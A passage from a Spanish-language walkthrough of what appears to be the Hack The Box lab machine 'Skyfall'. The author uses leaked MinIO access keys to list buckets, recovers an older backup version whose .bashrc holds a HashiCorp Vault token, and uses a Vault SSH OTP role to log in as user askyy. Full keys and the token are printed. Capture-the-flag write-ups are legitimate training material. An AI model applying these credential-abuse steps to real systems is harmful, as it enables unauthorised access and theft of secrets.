</span></span></span><span class=line><span class=cl><span class=go>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ (q)uit/esc
</span></span></span><span class=line><span class=cl><span class=go>NAME:
</span></span></span><span class=line><span class=cl><span class=go>  mc - MinIO Client for object storage and filesystems.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>USAGE:
</span></span></span><span class=line><span class=cl><span class=go>  mc [FLAGS] COMMAND [COMMAND FLAGS | -h] [ARGUMENTS...]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>COMMANDS:
</span></span></span><span class=line><span class=cl><span class=go>  alias      manage server credentials in configuration file
</span></span></span><span class=line><span class=cl><span class=go>  admin      manage MinIO servers
</span></span></span><span class=line><span class=cl><span class=go>  anonymous  manage anonymous access to buckets and objects
</span></span></span><span class=line><span class=cl><span class=go>  batch      manage batch jobs
</span></span></span><span class=line><span class=cl><span class=go>  cp         copy objects
</span></span></span><span class=line><span class=cl><span class=go>  cat        display object contents
</span></span></span><span class=line><span class=cl><span class=go>  diff       list differences in object name, size, and date between two buckets
</span></span></span><span class=line><span class=cl><span class=go>  du         summarize disk usage recursively
</span></span></span><span class=line><span class=cl><span class=go>  encrypt    manage bucket encryption config
</span></span></span><span class=line><span class=cl><span class=go>  event      manage object notifications
</span></span></span><span class=line><span class=cl><span class=go>  find       search for objects
</span></span></span><span class=line><span class=cl><span class=go>  get        get s3 object to local
</span></span></span><span class=line><span class=cl><span class=go>  head       display first &#39;n&#39; lines of an object
</span></span></span><span class=line><span class=cl><span class=go>  ilm        manage bucket lifecycle
</span></span></span><span class=line><span class=cl><span class=go>  idp        manage MinIO IDentity Provider server configuration
</span></span></span><span class=line><span class=cl><span class=go>  license    license related commands
</span></span></span><span class=line><span class=cl><span class=go>  legalhold  manage legal hold for object(s)
</span></span></span><span class=line><span class=cl><span class=go>  ls         list buckets and objects
</span></span></span><span class=line><span class=cl><span class=go>  mb         make a bucket
</span></span></span><span class=line><span class=cl><span class=go>  mv         move objects
</span></span></span><span class=line><span class=cl><span class=go>  mirror     synchronize object(s) to a remote site
</span></span></span><span class=line><span class=cl><span class=go>  od         measure single stream upload and download
</span></span></span><span class=line><span class=cl><span class=go>  ping       perform liveness check
</span></span></span><span class=line><span class=cl><span class=go>  pipe       stream STDIN to an object
</span></span></span><span class=line><span class=cl><span class=go>  put        upload an object to a bucket
</span></span></span><span class=line><span class=cl><span class=go>  quota      manage bucket quota
</span></span></span><span class=line><span class=cl><span class=go>  rm         remove object(s)
</span></span></span></code></pre></div><p>Buscando en la <a href=https://min.io/docs/minio/linux/index.html class=external-link target=_blank rel=noopener>documentaci√≥n</a> para este binario tenemos que correr lo siguiente para hacer un deploy en local:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mc alias set &lt;alias&gt; &lt;endpoint&gt; &lt;access-key&gt; &lt;secret-key&gt;
</span></span></span></code></pre></div><p>donde <code>&lt;alias></code> es el nombre que le daremos a la conexi√≥n, <code>&lt;endpoint></code> es la url del servicio <code>MinIO</code>, <code>&lt;access-key></code> es una llave de acceso o usuario, y <code>&lt;secret-key></code> es una llave secreta o contrase√±a.</p><p>Una vez agregada, podemos revisar todos los recursos corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mc ls --recursive --versions &lt;alias&gt;
</span></span></span></code></pre></div><p>En mi caso, le dar√© a la conexi√≥n el nombre de <code>leaked</code> y utilizar√© las contrase√±as filtradas de la vulnerabilidad del endpoint. As√≠, corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc alias set leaked http://prd23-s3-backend.skyfall.htb/ 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mc: Configuration written to `/home/gunzf0x/.mc/config.json`. Please update your access credentials.
</span></span></span><span class=line><span class=cl><span class=go>mc: Successfully created `/home/gunzf0x/.mc/share`.
</span></span></span><span class=line><span class=cl><span class=go>mc: Initialized share uploads `/home/gunzf0x/.mc/share/uploads.json` file.
</span></span></span><span class=line><span class=cl><span class=go>mc: Initialized share downloads `/home/gunzf0x/.mc/share/downloads.json` file.
</span></span></span><span class=line><span class=cl><span class=go>Added `leaked` successfully.
</span></span></span></code></pre></div><p>Y podemos revisar su contenido:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc ls --recursive --versions leaked
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[2023-11-08 01:59:15 -03]     0B askyy/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:28 -03]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-09 18:37:25 -03] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-09 18:37:09 -03] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-09 18:36:30 -03] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:56 -03]     0B btanner/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:36 -03]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:33 -03]     0B emoneypenny/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:56 -03]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:22 -03]     0B gmallory/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:36:02 -03]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-07 21:08:01 -03]     0B guest/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-07 21:08:05 -03]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:59:05 -03]     0B jbond/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:45 -03]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:10 -03]     0B omansfield/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:36:09 -03]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:45 -03]     0B rsilva/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:51 -03]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
</span></span></span></code></pre></div><p>donde puedo ver un archivo de respaldo llamado <code>askyy/home_backup.tar</code></p><p>Ahora, podemos copiar archivos corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mc cp &lt;path-inside-alias&gt; &lt;outfile-name&gt; 
</span></span></span></code></pre></div><p>De manera que ejecuto:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc cp --recursive leaked/askyy/home_backup.tar.gz ./home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>...b/askyy/home_backup.tar.gz: 2.48 KiB / 2.48 KiB ‚îÉ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚îÉ 1.97 KiB/s 1s
</span></span></span></code></pre></div><p>Extraigo el contenido del comprimido y noto que ahora tenemos algunos archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cd home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x 4096 May 19 20:19 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x 4096 May 19 20:20 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 2543 May 19 20:19 home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ tar -xzvf home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./
</span></span></span><span class=line><span class=cl><span class=go>./.profile
</span></span></span><span class=line><span class=cl><span class=go>./.bashrc
</span></span></span><span class=line><span class=cl><span class=go>./.ssh/
</span></span></span><span class=line><span class=cl><span class=go>./.ssh/authorized_keys
</span></span></span><span class=line><span class=cl><span class=go>./.sudo_as_admin_successful
</span></span></span><span class=line><span class=cl><span class=go>./.bash_history
</span></span></span><span class=line><span class=cl><span class=go>./.bash_logout
</span></span></span><span class=line><span class=cl><span class=go>./.cache/
</span></span></span><span class=line><span class=cl><span class=go>./.cache/motd.legal-displayed
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 36
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 gunzf0x gunzf0x 4096 Nov  9  2023 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x 4096 May 19 20:20 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    1 Nov  9  2023 .bash_history
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 3771 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 2543 May 19 20:19 home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Nov  9  2023 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    0 Oct  9  2023 .sudo_as_admin_successful
</span></span></span></code></pre></div><p>pero, tristemente, no hay nada interesante.</p><p>Ya en este punto muerto recuerdo que hab√≠an distintas versiones del archivo <code>askyy/home_backup.tar.gz</code>. I asumo que son diferentes &ldquo;logs/tags&rdquo; cuando hacemos cambios/realizamos un nuevo respaldo. Una de las versiones que se mostraban era <code>2b75346d-2a47-4203-ab09-3c9f878466b8</code> para el archivo comprimido de respaldo. De manera que descargamos espec√≠ficamente esa versi√≥n usando la flag <code>--vid</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 leaked/askyy/home_backup.tar.gz ./home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>...b/askyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ‚îÉ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚îÉ 2.39 KiB/s 1s
</span></span></span></code></pre></div><p>y vuelvo a extraer su contenido.</p><p>Si reviso los archivos descomprimidos de este archivo con distinta versi√≥n, noto que los archivos son muy similares (por no decir que son los mismos) al archivo de respaldo que hab√≠amos descomprimido primeramente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 36
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 gunzf0x gunzf0x 4096 Nov  9  2023 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 5 gunzf0x gunzf0x 4096 May 19 18:21 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    1 Nov  9  2023 .bash_history
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 3953 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 2705 May 19 20:27 home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Nov  9  2023 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    0 Oct  9  2023 .sudo_as_admin_successful
</span></span></span></code></pre></div><p>Sin embargo, el archivo <code>.bashrc</code> es ligeramente diferente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat .bashrc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> ~/.bashrc: executed by bash<span class=o>(</span>1<span class=o>)</span> <span class=k>for</span> non-login shells.
</span></span><span class=line><span class=cl><span class=gp>#</span> see /usr/share/doc/bash/examples/startup-files <span class=o>(</span>in the package bash-doc<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=gp>#</span> <span class=k>for</span> examples
</span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>export VAULT_API_ADDR=&#34;http://prd23-vault-internal.skyfall.htb&#34;
</span></span></span><span class=line><span class=cl><span class=go>export VAULT_TOKEN=&#34;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Donde encontramos una variable con el nombre <code>VAULT_TOKEN</code> y un nuevo dominio <code>prd23-vault-internal.skyfall.htb</code>.</p><p>Vuelvo a agregar este nuevo dominio a mi archivo <code>/etc/hosts</code>, de manera que ahora √©ste se ve como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb prd23-vault-internal.skyfall.htb
</span></span></span></code></pre></div><p>Buscando por esta variable <code>VAULT_TOKEN</code>, encontramos que √©sta es usada para <code>HashiCorp Vault</code>:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>HashiCorp Vault</code> is a powerful tool designed for securely managing secrets and protecting sensitive data. It is part of the HashiCorp suite of infrastructure management tools</div></div><p>Es decir, es un servicio para administrar y proteger data sensible.</p><p>Ya sabiendo esto, buscamos y descargamos el binario de <code>HashiCorp Vault</code> para <code>Linux</code> (compatible a la arquitectura de nuestra m√°quina de atacante) con <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://releases.hashicorp.com/vault/1.16.2/vault_1.16.2_linux_amd64.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-19 20:38:13--  https://releases.hashicorp.com/vault/1.16.2/vault_1.16.2_linux_amd64.zip
</span></span></span><span class=line><span class=cl><span class=go>Resolving releases.hashicorp.com (releases.hashicorp.com)... 3.162.221.26, 3.162.221.105, 3.162.221.48, ...
</span></span></span><span class=line><span class=cl><span class=go>Connecting to releases.hashicorp.com (releases.hashicorp.com)|3.162.221.26|:443... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 143229555 (137M) [application/zip]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòvault_1.16.2_linux_amd64.zip‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>vault_1.16.2_linux_amd64.zip               100%[=======================================================================================&gt;] 136.59M  55.9MB/s    in 2.4s
</span></span></span></code></pre></div><p>Exportamos los valores hallados:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ export VAULT_API_ADDR=&#34;http://prd23-vault-internal.skyfall.htb&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_TOKEN=&#34;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_ADDR=&#34;http://prd23-vault-internal.skyfall.htb&#34;
</span></span></span></code></pre></div><p>y corremos el binario de <code>HashiCorp Vault</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault login
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Token (will be hidden): hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
</span></span></span><span class=line><span class=cl><span class=go>WARNING! The VAULT_TOKEN environment variable is set! The value of this
</span></span></span><span class=line><span class=cl><span class=go>variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
</span></span></span><span class=line><span class=cl><span class=go>update its value accordingly.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Success! You are now authenticated. The token information displayed below
</span></span></span><span class=line><span class=cl><span class=go>is already stored in the token helper. You do NOT need to run &#34;vault login&#34;
</span></span></span><span class=line><span class=cl><span class=go>again. Future Vault requests will automatically use this token.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Key                  Value
</span></span></span><span class=line><span class=cl><span class=go>---                  -----
</span></span></span><span class=line><span class=cl><span class=go>token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
</span></span></span><span class=line><span class=cl><span class=go>token_accessor       rByv1coOBC9ITZpzqbDtTUm8
</span></span></span><span class=line><span class=cl><span class=go>token_duration       433388h16m12s
</span></span></span><span class=line><span class=cl><span class=go>token_renewable      true
</span></span></span><span class=line><span class=cl><span class=go>token_policies       [&#34;default&#34; &#34;developers&#34;]
</span></span></span><span class=line><span class=cl><span class=go>identity_policies    []
</span></span></span><span class=line><span class=cl><span class=go>policies             [&#34;default&#34; &#34;developers&#34;]
</span></span></span></code></pre></div><p>de donde, como token, simplemente he pasado el valor de la variable <code>VAULT_TOKEN</code> hallada.</p><p>Podemos entonces enumerar distintos roles siguiendo como referencia <a href=https://stackoverflow.com/questions/60869391/hashicorp-vault-how-to-list-all-roles class=external-link target=_blank rel=noopener>este post de StackOverflow</a> para ver si hay roles para el servicio <code>SSH</code> (que, recordar, estaba activo en la m√°quina v√≠ctima):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault token capabilities ssh/roles
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>list
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ./vault list ssh/roles
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Keys
</span></span></span><span class=line><span class=cl><span class=go>----
</span></span></span><span class=line><span class=cl><span class=go>admin_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go>dev_otp_key_role
</span></span></span></code></pre></div><p>donde encontramos 2 keys: <code>admin_otp_key_role</code> y <code>dev_otp_key_role</code>.</p><p>Asumiendo que estas credenciales pertenecen al usuario del que se extrajo el archivo de respaldo (llamado <code>askyy</code>), nos intentamos loguear con la key <code>admin_otp_key_role</code> a trav√©s de <code>SSH</code>. Pero esto no funcion√≥:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>failed to generate credential: failed to get credentials: Error making API request.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>URL: PUT http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/admin_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go>Code: 403. Errors:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>* 1 error occurred:
</span></span></span><span class=line><span class=cl><span class=go>        * permission denied
</span></span></span></code></pre></div><p>Pero si usamos la key <code>dev_otp_key_role</code>, somos capaces de ingresar a trav√©s de <code>SSH</code> como el usuario <code>askyy</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Permanently added &#39;10.10.11.254&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=go>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy
</span></span></span></code></pre></div><p>Por fin podemos obtener la flag del usuario en el directorio home de <code>askyy</code>.</p><p>Antes de continuar, intentemos leer el contenido de <code>dev_otp_key_role</code>. Puede que (y pasar√°) m√°s tarde necesitamos conectarnos por medio de <code>SSH</code> como el usuario <code>askyy</code> en m√∫ltiples sesiones/terminales.</p><p>Buscando c√≥mo leer archivos <code>key</code> en <code>HashiCorp Vault</code> encontramos <a href=https://developer.hashicorp.com/vault/docs/commands/read class=external-link target=_blank rel=noopener>esta documentaci√≥n explicando c√≥mo hacerlo</a>. Pero siguiendo las instrucciones de la p√°gina retorna un error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault read ssh/creds/dev_otp_key_role
